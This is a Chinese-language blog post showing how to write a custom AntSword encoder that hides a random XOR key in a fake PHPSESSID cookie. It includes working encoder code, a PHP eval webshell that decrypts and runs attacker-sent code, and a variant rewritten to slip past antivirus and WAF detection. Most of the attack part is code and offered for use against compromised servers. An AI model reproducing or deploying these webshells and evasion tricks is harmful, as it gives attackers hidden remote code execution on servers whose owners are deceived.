# 基于随机Cookie的蚁剑动态秘钥编码器


<meta name="referrer" content="no-referrer" />

## 前言

在上一篇[蚁剑实现动态秘钥编码器解码器](https://yzddmr6.tk/posts/antsword-xor-encoder/)中，本人为了规避握手交换秘钥的特征，采用了利用时间生成随机秘钥的办法。

但是在实际使用的过程中还是会出现各种各样的玄学BUG，导致利用失败，我个人不是特别满意。

研究了一下蚁剑编码器的ext参数后，决定采用利用随机Cookie来产生随机秘钥的方式。

## 正文

### 编码器的ext参数

本来一直等蚁剑作者写编码器的第三篇，结果一直没等到。。。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383257-4f526489-5d72-4d99-85fe-6fd0a21d5bce.png)

算了还是自己研究一下吧

首先新建一个编码器，名字叫test吧

加入一行`console.log(ext.opts.httpConf);`

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383556-dc1b8f50-2c79-4b70-8688-4d1dcfde8009.png)

然后随便连接一个shell，打开开发者工具，可以看到已经打印出了我们所需要的信息

包括shell请求的body跟headers头

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383693-02eff20b-7976-43ed-b530-867b34466f31.png)

抓包看一下，headers头的结果跟抓包的结果是一致的

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900383822-a4f99bd7-4668-4120-b9b1-12b478515a0a.png)

那么我们能否从编码器中修改headers头呢

我们在编码器中加入一行

```
ext.opts.httpConf.headers['User-Agent']='yzddMr6';
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384241-8e165fa5-267c-44ac-9d1c-fd685952ddbf.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384562-d81a4364-b3b7-4382-89a0-050233151245.png)

可以看到我们已经成功修改了shell中UA的值。

同理，我们也可以在编码器中对其他header头或者body进行修改。

### 随机生成Cookie

既然我们已经可以任意修改shell的请求信息，我们就可以把秘钥放在一个指定的headers字段里，shell获取后再对payload进行加解密。

但是突然多出来一个奇奇怪怪的字段，长时间后就会变成waf识别的特征。

那么有没有什么是变化的，并且很常见的headers头呢？

我们就可以想到利用Cookie。

参考蚁剑的aes编码器，它所采用的方法是人工首先访问shell生成一个sessionid，填入shell配置后作为后面通讯的秘钥。

但是实际上因为我们已经可以控制cookie字段，我们完全可以在编码器中每次生成一个随机的cookie，这样就省去了人工操作的一步。

有一个坑要注意，php的session id一般是26位的，所以我们最好也生成一个26位的秘钥，增强伪装性。（虽然可能并没有什么卵用）

### 具体实现

#### 编码器

```
'use strict';
//code by yzddmr6
module.exports = (pwd, data, ext = {}) => {
  let randomID = `x${Math.random().toString(16).substr(2)}`;
  function xor(payload) {
    let crypto = require('crypto');
    let key = crypto.createHash('md5').update(randomID).digest('hex').substr(6);
    ext.opts.httpConf.headers['Cookie'] = 'PHPSESSID=' + key;
    key = key.split("").map(t => t.charCodeAt(0));
    //let payload="phpinfo();";
    let cipher = payload.split("").map(t => t.charCodeAt(0));
    for (let i = 0; i < cipher.length; i++) {
      cipher[i] = cipher[i] ^ key[i % 26]
    }
    cipher = cipher.map(t => String.fromCharCode(t)).join("")
    cipher = Buffer.from(cipher).toString('base64');
    //console.log(cipher)
    return cipher;
  }
  data['_'] = Buffer.from(data['_']).toString('base64');
  data[pwd] = `eval(base64_decode("${data['_']}"));`;
  data[pwd]=xor(data[pwd]);
  delete data['_'];
  return data;
}
```

#### Shell原型

```
<?php
@$post=base64_decode($_REQUEST['test']);
$key=@$_COOKIE['PHPSESSID'];
for($i=0;$i<strlen($post);$i++){
    $post[$i] = $post[$i] ^ $key[$i%26];
}
@eval($post);
?>
```

#### 免杀处理

```
<?php
class Cookie
{
    function __construct()
    {
        $key=@$_COOKIE['PHPSESSID'];
        @$post=base64_decode($_REQUEST['test']);
        for($i=0;$i<strlen($post);$i++){
            $post[$i] = $post[$i] ^ $key[$i%26];
        }
        return $post;
    }
    function __destruct()
    {return @eval($this->__construct());}
}
$check=new Cookie();
?>
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384760-56a49e0f-5695-415a-83b6-978d4d8242ef.png)

### 连接测试

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900384896-5cca44f3-be28-4bf6-8cd0-b7a9cfb5d049.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900385035-26886543-d3e7-4c2c-ac82-238dffc241d1.png)

## 最后

还是老问题，蚁剑的其他参数只是一层base64，这个就需要大家自己手工去改了。

蚁剑牛逼！
